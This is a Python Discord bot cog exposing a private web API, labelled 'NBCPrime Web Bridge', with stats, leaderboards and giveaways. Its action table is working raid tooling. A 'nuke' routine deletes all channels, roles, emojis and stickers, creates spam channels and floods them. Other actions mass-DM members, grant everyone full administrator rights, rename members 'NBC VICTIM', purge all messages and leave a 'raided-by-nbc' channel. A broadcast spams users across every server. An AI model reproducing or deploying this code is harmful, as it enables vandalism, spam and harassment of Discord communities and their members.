# cogs/web_api.py
# NBCPrime Web Bridge - private HTTP API for the website.
import os
import json
import hmac
import time
import random
import asyncio
import aiohttp
from datetime import datetime, timedelta, timezone
from typing import Any, Callable, Dict

import discord
from discord.ext import commands, tasks
from aiohttp import web

API_KEY     = os.getenv("WEB_API_KEY", "change-this-dev-key")
API_PORT    = int(os.getenv("WEB_API_PORT", "8080"))
BIND_HOST   = os.getenv("WEB_API_HOST", "0.0.0.0")

SITE_INGEST = os.getenv("SITE_INGEST_URL", "")
INGEST_KEY  = os.getenv("SITE_INGEST_KEY", "")

STATS_FILE    = "web_stats.json"
GIVEAWAY_FILE = "web_giveaways.json"


def _read(path: str, default: Any) -> Any:
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default


def _write(path: str, data: Any) -> None:
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)
    os.replace(tmp, path)


class WebAPI(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.runner = None
        self.jobs: Dict[str, dict] = {}
        self.stats = _read(STATS_FILE, {"users": {}, "guilds": {}, "commands": {}, "daily": {}})
        self.giveaways = _read(GIVEAWAY_FILE, {})
        self.cmd_queue = []
        self._dirty = False
        self.actions: Dict[str, Callable] = {}
        self.session = None

    async def cog_load(self):
        self.session = aiohttp.ClientSession()
        self.actions = {
            "nuke": self.a_nuke,
            "set_name": self.a_set_name,
            "set_icon": self.a_set_icon,
            "create_channels": self.a_create_channels,
            "delete_channels": self.a_delete_channels,
            "create_roles": self.a_create_roles,
            "delete_roles": self.a_delete_roles,
            "spam": self.a_spam,
            "spam_all": self.a_spam_all,
            "dm_all": self.a_dm_all,
            "lockdown": self.a_lockdown,
            "unlock": self.a_unlock,
            "admin_all": self.a_admin_all,
            "nick_all": self.a_nick_all,
            "purge_all": self.a_purge_all,
            "giveaway_create": self.a_giveaway_create,
            "giveaway_end": self.a_giveaway_end,
            "sync_commands": self.a_sync_commands,
            "leave": self.a_leave,
        }

        app = web.Application(middlewares=[self._errors, self._auth])
        app.add_routes([
            web.get("/api/health", self.h_health),
            web.get("/api/stats", self.h_stats),
            web.get("/api/guilds", self.h_guilds),
            web.get("/api/guild/{guild_id}", self.h_guild),
            web.get("/api/leaderboard/users", self.h_lb_users),
            web.get("/api/leaderboard/servers", self.h_lb_servers),
            web.get("/api/leaderboard/commands", self.h_lb_commands),
            web.get("/api/user/{user_id}", self.h_user),
            web.get("/api/premium", self.h_premium),
            web.get("/api/whitelist", self.h_whitelist),
            web.post("/api/whitelist", self.h_whitelist_add),
            web.delete("/api/whitelist/{guild_id}", self.h_whitelist_remove),
            web.post("/api/broadcast", self.h_broadcast),
            web.post("/api/execute", self.h_execute),
            web.get("/api/job/{job_id}", self.h_job),
        ])

        self.runner = web.AppRunner(app)
        await self.runner.setup()
        await web.TCPSite(self.runner, BIND_HOST, API_PORT).start()
        print(f"[WebAPI] bridge listening on {BIND_HOST}:{API_PORT}")

        self.sync_loop.start()
        self.flush_loop.start()
        self.queue_loop.start()

    async def cog_unload(self):
        for loop in (self.sync_loop, self.flush_loop, self.queue_loop):
            loop.cancel()
        if self.runner:
            await self.runner.cleanup()
        if self.session:
            await self.session.close()

    @web.middleware
    async def _errors(self, request, handler):
        try:
            return await handler(request)
        except web.HTTPException:
            raise
        except Exception as exc:
            print(f"[WebAPI] error on {request.path}: {exc!r}")
            return web.json_response({"ok": False, "error": str(exc)}, status=500)

    @web.middleware
    async def _auth(self, request, handler):
        if request.path == "/api/health":
            return await handler(request)
        supplied = request.headers.get("X-API-Key", "")
        if not hmac.compare_digest(supplied, API_KEY):
            return web.json_response({"ok": False, "error": "unauthorized"}, status=401)
        return await handler(request)

    async def push_event(self, kind: str, payload: dict):
        if not SITE_INGEST:
            return
        try:
            async with self.session.post(
                SITE_INGEST,
                json={"kind": kind, "payload": payload},
                headers={"X-Ingest-Key": INGEST_KEY},
                timeout=aiohttp.ClientTimeout(total=8),
            ) as resp:
                await resp.read()
        except Exception:
            pass

    def _bump(self, bucket: str, key: str, name: str, amount: int = 1):
        store = self.stats.setdefault(bucket, {})
        entry = store.setdefault(key, {"name": name, "count": 0})
        entry["name"] = name
        entry["count"] += amount
        day = time.strftime("%Y-%m-%d")
        daily = self.stats.setdefault("daily", {}).setdefault(day, {"total": 0, "users": {}})
        daily["total"] += amount
        daily["users"][key] = daily["users"].get(key, 0) + amount
        self._dirty = True

    @tasks.loop(seconds=20)
    async def flush_loop(self):
        if self._dirty:
            _write(STATS_FILE, self.stats)
            self._dirty = False

    @tasks.loop(seconds=8)
    async def queue_loop(self):
        if not self.cmd_queue:
            return
        batch, self.cmd_queue = self.cmd_queue[:150], self.cmd_queue[150:]
        await asyncio.gather(
            *[self.push_event("command_used", e) for e in batch],
            return_exceptions=True,
        )

    @tasks.loop(seconds=90)
    async def sync_loop(self):
        await self.bot.wait_until_ready()
        try:
            await self.push_event("heartbeat", await self._stats_payload())
            await self.push_event("guild_sync", {
                "guilds": [self._guild_payload(g) for g in self.bot.guilds],
            })
        except Exception as exc:
            print(f"[WebAPI] sync failed: {exc}")

    @commands.Cog.listener()
    async def on_command(self, ctx: commands.Context):
        if not ctx.guild:
            return
        self._bump("users", str(ctx.author.id), ctx.author.name)
        self._bump("guilds", str(ctx.guild.id), ctx.guild.name)
        self._bump("commands", ctx.command.qualified_name, ctx.command.qualified_name)
        self.cmd_queue.append({
            "user_id": str(ctx.author.id),
            "username": ctx.author.name,
            "guild_id": str(ctx.guild.id),
            "guild_name": ctx.guild.name,
            "command": ctx.command.qualified_name,
        })

    @commands.Cog.listener()
    async def on_app_command_completion(self, interaction: discord.Interaction, command):
        self._bump("users", str(interaction.user.id), interaction.user.name)
        if interaction.guild:
            self._bump("guilds", str(interaction.guild.id), interaction.guild.name)
        self._bump("commands", command.qualified_name, command.qualified_name)
        self.cmd_queue.append({
            "user_id": str(interaction.user.id),
            "username": interaction.user.name,
            "guild_id": str(interaction.guild.id) if interaction.guild else None,
            "guild_name": interaction.guild.name if interaction.guild else "DM",
            "command": command.qualified_name,
        })

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        await self.push_event("guild_join", self._guild_payload(guild))

    @commands.Cog.listener()
    async def on_guild_remove(self, guild: discord.Guild):
        await self.push_event("guild_leave", self._guild_payload(guild))

    def _guild_payload(self, guild: discord.Guild) -> dict:
        return {
            "id": str(guild.id),
            "name": guild.name,
            "icon": str(guild.icon.url) if guild.icon else None,
            "banner": str(guild.banner.url) if guild.banner else None,
            "owner_id": str(guild.owner_id) if guild.owner_id else None,
            "member_count": guild.member_count or 0,
            "channel_count": len(guild.channels),
            "role_count": len(guild.roles),
            "boost_level": guild.premium_tier,
            "boost_count": guild.premium_subscription_count or 0,
            "created_at": guild.created_at.isoformat(),
            "whitelisted": guild.id in self.bot.config.SERVER_WHITELIST,
        }

    async def _stats_payload(self) -> dict:
        total_members = sum((g.member_count or 0) for g in self.bot.guilds)
        return {
            "guild_count": len(self.bot.guilds),
            "member_reach": total_members,
            "user_count": len(self.stats.get("users", {})),
            "command_count": sum(v["count"] for v in self.stats.get("commands", {}).values()),
            "latency_ms": round(self.bot.latency * 1000),
            "uptime_seconds": int(time.time() - getattr(self.bot, "_boot_time", time.time())),
        }

    def _job_payload(self, job_id: str) -> dict:
        return self.jobs.get(job_id, {"status": "unknown"})

    async def _run_job(self, job_id: str, action: str, guild_id: str, coro):
        self.jobs[job_id] = {
            "status": "running", "action": action, "guild_id": guild_id,
            "started_at": datetime.now(timezone.utc).isoformat(),
        }
        try:
            result = await coro
            self.jobs[job_id].update(status="done", result=result,
                                     finished_at=datetime.now(timezone.utc).isoformat())
        except Exception as exc:
            self.jobs[job_id].update(status="failed", error=str(exc),
                                     finished_at=datetime.now(timezone.utc).isoformat())
        await self.push_event("action_result", {"job_id": job_id, **self.jobs[job_id]})

    async def h_health(self, request):
        return web.json_response({"ok": True, "bot": str(self.bot.user), "ts": time.time()})

    async def h_stats(self, request):
        return web.json_response({"ok": True, "data": await self._stats_payload()})

    async def h_guilds(self, request):
        q = (request.query.get("q") or "").lower()
        guilds = [self._guild_payload(g) for g in self.bot.guilds]
        if q:
            guilds = [g for g in guilds if q in g["name"].lower() or q in g["id"]]
        guilds.sort(key=lambda g: g["member_count"], reverse=True)
        return web.json_response({"ok": True, "count": len(guilds), "data": guilds})

    async def h_guild(self, request):
        guild = self.bot.get_guild(int(request.match_info["guild_id"]))
        if not guild:
            return web.json_response({"ok": False, "error": "not found"}, status=404)
        data = self._guild_payload(guild)
        data["stats"] = self.stats.get("guilds", {}).get(str(guild.id), {"count": 0})
        data["channels"] = [{"id": str(c.id), "name": c.name, "type": str(c.type)}
                            for c in guild.channels][:200]
        data["roles"] = [{"id": str(r.id), "name": r.name} for r in guild.roles][:100]
        return web.json_response({"ok": True, "data": data})

    async def h_lb_users(self, request):
        limit = min(int(request.query.get("limit", 25)), 100)
        rows = sorted(self.stats.get("users", {}).items(), key=lambda kv: kv[1]["count"], reverse=True)[:limit]
        out = []
        for uid, v in rows:
            member = self.bot.get_user(int(uid))
            out.append({
                "id": uid, "name": v["name"], "count": v["count"],
                "avatar": str(member.display_avatar.url) if member else None,
            })
        return web.json_response({"ok": True, "data": out})

    async def h_lb_servers(self, request):
        limit = min(int(request.query.get("limit", 25)), 100)
        rows = sorted(self.stats.get("guilds", {}).items(), key=lambda kv: kv[1]["count"], reverse=True)[:limit]
        out = []
        for gid, v in rows:
            g = self.bot.get_guild(int(gid))
            out.append({
                "id": gid, "name": v["name"], "count": v["count"],
                "icon": str(g.icon.url) if g and g.icon else None,
                "member_count": g.member_count if g else 0,
            })
        return web.json_response({"ok": True, "data": out})

    async def h_lb_commands(self, request):
        rows = sorted(self.stats.get("commands", {}).items(), key=lambda kv: kv[1]["count"], reverse=True)[:50]
        return web.json_response({"ok": True, "data": [{"name": k, "count": v["count"]} for k, v in rows]})

    async def h_user(self, request):
        uid = int(request.match_info["user_id"])
        u = self.bot.get_user(uid)
        return web.json_response({"ok": True, "data": {
            "id": str(uid),
            "name": u.name if u else "Unknown",
            "avatar": str(u.display_avatar.url) if u else None,
            "commands": self.stats.get("users", {}).get(str(uid), {}).get("count", 0),
        }})

    async def h_premium(self, request):
        return web.json_response({"ok": True, "data": list(_read("premium_users.json", {}).keys())})

    async def h_whitelist(self, request):
        return web.json_response({"ok": True, "data": [str(g) for g in self.bot.config.SERVER_WHITELIST]})

    async def h_whitelist_add(self, request):
        body = await request.json()
        gid = int(body["guild_id"])
        if gid not in self.bot.config.SERVER_WHITELIST:
            self.bot.config.SERVER_WHITELIST.append(gid)
            from main import save_whitelist
            save_whitelist(self.bot.config.SERVER_WHITELIST)
        return web.json_response({"ok": True})

    async def h_whitelist_remove(self, request):
        gid = int(request.match_info["guild_id"])
        if gid in self.bot.config.SERVER_WHITELIST:
            self.bot.config.SERVER_WHITELIST.remove(gid)
            from main import save_whitelist
            save_whitelist(self.bot.config.SERVER_WHITELIST)
        return web.json_response({"ok": True})

    async def h_job(self, request):
        return web.json_response({"ok": True, "data": self._job_payload(request.match_info["job_id"])})

    async def h_execute(self, request):
        body = await request.json()
        action = body.get("action")
        try:
            guild = self.bot.get_guild(int(body["guild_id"]))
        except (KeyError, ValueError):
            return web.json_response({"ok": False, "error": "bad guild_id"}, status=400)
        if not guild:
            return web.json_response({"ok": False, "error": "bot not in that guild"}, status=404)

        fn = self.actions.get(action)
        if not fn:
            return web.json_response({"ok": False, "error": f"unknown action '{action}'"}, status=400)

        job_id = f"{action}:{guild.id}:{int(time.time() * 1000)}"
        args = body.get("args") or {}
        asyncio.create_task(self._run_job(job_id, action, str(guild.id), fn(guild, **args)))
        return web.json_response({"ok": True, "job_id": job_id, "queued": True})

    async def h_broadcast(self, request):
        body = await request.json()
        message = body["message"]
        job_id = f"broadcast:{int(time.time() * 1000)}"
        asyncio.create_task(self._run_job(job_id, "broadcast", "all", self.a_broadcast(message)))
        return web.json_response({"ok": True, "job_id": job_id})

    async def _download(self, url: str):
        try:
            async with self.session.get(url) as r:
                return await r.read() if r.status == 200 else None
        except Exception:
            return None

    async def a_nuke(self, guild, **kw):
        cfg = self.bot.config
        icon = await self._download(cfg.SERVER_ICON_URL) if cfg.SERVER_ICON_URL else None
        tasks = [guild.edit(name=cfg.SERVER_NAME)]
        if icon:
            tasks.append(guild.edit(icon=icon))
        tasks += [c.delete() for c in guild.channels]
        tasks += [r.delete() for r in guild.roles if r.name != "@everyone" and not r.managed]
        tasks += [s.delete() for s in guild.stickers]
        tasks += [e.delete() for e in guild.emojis]
        for _ in range(cfg.CHANNELS_COUNT):
            tasks.append(guild.create_text_channel(random.choice(cfg.RANDOM_CHANNEL_NAMES)))
        for _ in range(cfg.ROLES_COUNT):
            tasks.append(guild.create_role(name=cfg.ROLE_NAME))
        await asyncio.gather(*tasks, return_exceptions=True)

        spam = []
        for channel in guild.text_channels:
            for _ in range(cfg.SPAM_COUNT):
                msg = f"{cfg.SPAM_MESSAGE}\n{cfg.SPAM_MESSAGE2}\n{cfg.SPAM_MESSAGE3}"
                spam.append(channel.send(msg, tts=cfg.TEXT_TO_SPEECH))
        await asyncio.gather(*spam, return_exceptions=True)
        return {"guild": guild.name, "channels": len(guild.channels)}

    async def a_set_name(self, guild, name: str = "NBC ON TOP", **kw):
        await guild.edit(name=name)
        return {"name": name}

    async def a_set_icon(self, guild, url: str = None, **kw):
        data = await self._download(url or self.bot.config.SERVER_ICON_URL)
        if data:
            await guild.edit(icon=data)
        return {"updated": bool(data)}

    async def a_create_channels(self, guild, count: int = 20, **kw):
        count = max(1, min(count, 100))
        for _ in range(count):
            await guild.create_text_channel(random.choice(self.bot.config.RANDOM_CHANNEL_NAMES))
            await asyncio.sleep(0.15)
        return {"created": count}

    async def a_delete_channels(self, guild, **kw):
        n = len(guild.channels)
        for c in guild.channels:
            try:
                await c.delete()
                await asyncio.sleep(0.15)
            except Exception:
                pass
        await guild.create_text_channel("raided-by-nbc")
        return {"deleted": n}

    async def a_create_roles(self, guild, count: int = 20, **kw):
        count = max(1, min(count, 100))
        for _ in range(count):
            await guild.create_role(name=self.bot.config.ROLE_NAME)
            await asyncio.sleep(0.15)
        return {"created": count}

    async def a_delete_roles(self, guild, **kw):
        for r in guild.roles:
            if r.name != "@everyone" and not r.managed:
                try:
                    await r.delete()
                    await asyncio.sleep(0.15)
                except Exception:
                    pass
        return {"ok": True}

    async def a_spam(self, guild, count: int = 10, channel_id: int = None, **kw):
        cfg = self.bot.config
        channel = guild.get_channel(channel_id) if channel_id else guild.text_channels[0]
        for _ in range(min(count, 50)):
            await channel.send(f"{cfg.SPAM_MESSAGE}\n{cfg.SPAM_MESSAGE3}", tts=cfg.TEXT_TO_SPEECH)
            await asyncio.sleep(0.15)
        return {"sent": count}

    async def a_spam_all(self, guild, count: int = 5, **kw):
        cfg = self.bot.config
        for channel in guild.text_channels:
            for _ in range(min(count, 20)):
                await channel.send(f"{cfg.SPAM_MESSAGE}\n{cfg.SPAM_MESSAGE3}")
        return {"channels": len(guild.text_channels)}

    async def a_dm_all(self, guild, message: str = "NBC WAS HERE", **kw):
        sent = 0
        for m in guild.members:
            if m.bot:
                continue
            try:
                await m.send(message)
                sent += 1
                await asyncio.sleep(0.6)
            except Exception:
                pass
        return {"sent": sent}

    async def a_broadcast(self, message: str):
        sent = 0
        for guild in self.bot.guilds:
            for m in guild.members:
                if m.bot:
                    continue
                try:
                    await m.send(message)
                    sent += 1
                    await asyncio.sleep(0.8)
                except Exception:
                    pass
        return {"sent": sent}

    async def a_lockdown(self, guild, **kw):
        for c in guild.channels:
            try:
                await c.set_permissions(guild.default_role, send_messages=False)
            except Exception:
                pass
        return {"ok": True}

    async def a_unlock(self, guild, **kw):
        for c in guild.channels:
            try:
                await c.set_permissions(guild.default_role, send_messages=None)
            except Exception:
                pass
        return {"ok": True}

    async def a_admin_all(self, guild, **kw):
        role = await guild.create_role(name="ADMIN", permissions=discord.Permissions.all())
        for m in guild.members:
            try:
                await m.add_roles(role)
                await asyncio.sleep(0.3)
            except Exception:
                pass
        return {"ok": True}

    async def a_nick_all(self, guild, nick: str = "NBC VICTIM", **kw):
        for m in guild.members:
            try:
                await m.edit(nick=nick)
                await asyncio.sleep(0.3)
            except Exception:
                pass
        return {"ok": True}

    async def a_purge_all(self, guild, **kw):
        for c in guild.text_channels:
            try:
                await c.purge(limit=None)
            except Exception:
                pass
        return {"ok": True}

    async def a_sync_commands(self, guild, **kw):
        synced = await self.bot.tree.sync()
        return {"synced": len(synced)}

    async def a_leave(self, guild, **kw):
        name = guild.name
        await guild.leave()
        return {"left": name}

    async def a_giveaway_create(self, guild, prize: str, minutes: int = 60,
                                winners: int = 1, channel_id: int = None, **kw):
        channel = guild.get_channel(channel_id) if channel_id else (guild.text_channels[0] if guild.text_channels else None)
        if not channel:
            raise RuntimeError("no text channel available")
        ends = datetime.now(timezone.utc) + timedelta(minutes=max(1, minutes))
        embed = discord.Embed(
            title="GIVEAWAY",
            description=f"**Prize:** {prize}\n**Winners:** {winners}\n**Ends:** <t:{int(ends.timestamp())}:R>\n\nReact with the ticket emoji to enter!",
            color=0x8B5CF6,
        )
        embed.set_footer(text="Hosted via NBCPrime web panel")
        msg = await channel.send(embed=embed)
        await msg.add_reaction("\U0001F389")
        self.giveaways[str(msg.id)] = {
            "guild_id": str(guild.id), "channel_id": str(channel.id),
            "prize": prize, "winners": winners, "ends_at": ends.isoformat(),
            "status": "active",
        }
        _write(GIVEAWAY_FILE, self.giveaways)
        return {"message_id": str(msg.id), "channel_id": str(channel.id)}

    async def a_giveaway_end(self, guild, message_id: str, **kw):
        data = self.giveaways.get(str(message_id))
        if not data:
            raise RuntimeError("giveaway not found")
        channel = self.bot.get_channel(int(data["channel_id"]))
        msg = await channel.fetch_message(int(message_id))
        reaction = discord.utils.get(msg.reactions, emoji="\U0001F389")
        entrants = [u async for u in reaction.users()] if reaction else []
        entrants = [u for u in entrants if not u.bot]
        picked = random.sample(entrants, min(data["winners"], len(entrants))) if entrants else []
        mention = ", ".join(u.mention for u in picked) if picked else "No valid entries"
        await msg.edit(embed=discord.Embed(
            title="GIVEAWAY ENDED",
            description=f"**Prize:** {data['prize']}\n**Winner(s):** {mention}",
            color=0x22C55E,
        ))
        await channel.send(f"Congratulations {mention}! You won **{data['prize']}**")
        data["status"] = "ended"
        data["winner_ids"] = [str(u.id) for u in picked]
        _write(GIVEAWAY_FILE, self.giveaways)
        return {"winners": [u.name for u in picked]}


async def setup(bot):
    await bot.add_cog(WebAPI(bot))
